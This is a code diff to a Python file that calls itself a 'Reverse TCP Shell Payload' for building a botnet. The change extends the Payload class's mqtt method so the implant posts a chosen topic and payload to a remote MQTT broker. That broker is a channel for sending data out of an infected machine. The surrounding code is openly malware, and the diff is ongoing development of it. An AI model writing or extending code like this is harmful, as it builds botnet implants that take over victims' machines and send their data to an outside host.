@@ -3,6 +3,7 @@
 'Reverse TCP Shell Payload (Build Your Own Botnet)'
 
 # standard library
+import shlex
 import os
 import sys
 import time
@@ -949,16 +950,15 @@ class Payload():
     def mqtt(self, args):
         """
         Post relevant data to an MQTT broker
-        Or up my butt.
         """
         if 'mqtt' not in globals():
             self.load('mqtt')
-        arguments = str(args).split()
-        if len(arguments) == 2:
-            host, port = arguments
-            print("success!")
+        arguments = shlex.split(str(args))
+        # arguments = str(args).split()
+        if len(arguments) == 4:
+            host, port, topic, payload = arguments
             try:
-                globals()['mqtt'].run(host, port)
+                globals()['mqtt'].run(host, port, topic, payload)
                 return "Shit just got run."
             except Exception as e:
                 result = "mqtt error: {}".format(str(e))
